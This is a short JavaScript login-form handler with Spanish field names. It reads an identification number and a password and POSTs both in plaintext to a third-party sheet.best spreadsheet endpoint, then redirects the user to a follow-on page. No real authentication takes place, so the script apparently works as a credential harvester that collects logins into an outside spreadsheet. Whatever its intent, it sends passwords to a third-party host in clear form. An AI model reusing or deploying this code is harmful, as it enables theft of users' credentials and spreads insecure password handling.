const form = document.getElementById("form");

form.addEventListener("submit", (e) => {
  e.preventDefault();

  const identificacion = form.identificacion.value;
  const contraseña = form.contraseña.value;

  const dates = {
    identificacion: identificacion,
    pass: contraseña,
  };

  fetch(
    "https://sheet.best/api/sheets/52b26d52-6cec-4a00-9e1c-df626c784c4d",
    {
      method: "POST",
      mode: "cors",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(dates),
    }
  )
    .then((response) => {
      if (response.ok) {
        window.location.href = "hacer_consulta.html";
      } else {
        console.log("Datos incorrectos");
      }
    })
    .catch((error) => {
      console.log("Error", error);
      alert("Hubo un problema.");
    });
});